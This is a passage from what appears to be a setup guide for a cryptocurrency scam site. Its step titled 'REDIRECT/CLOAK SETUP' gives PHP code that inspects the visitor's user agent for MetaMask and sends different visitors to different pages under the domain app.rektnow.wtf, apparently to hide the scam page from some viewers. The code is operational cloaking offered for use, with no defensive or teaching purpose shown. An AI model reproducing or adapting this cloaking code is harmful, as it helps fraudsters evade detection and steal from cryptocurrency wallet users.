5. ⏳ REDIRECT/CLOAK SETUP
   ------------------------
   
   A. Simple Redirect (PHP):
   Create index.php in root domain:
   
   <?php
   // Detect MetaMask/Web3 wallet
   $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
   
   // If suspicious, redirect to safe page
   if (strpos($userAgent, 'MetaMask') !== false) {
       header('Location: https://app.rektnow.wtf/safe-page.html');
       exit;
   }
   
   // Otherwise show real site
   header('Location: https://app.rektnow.wtf');
   ?>
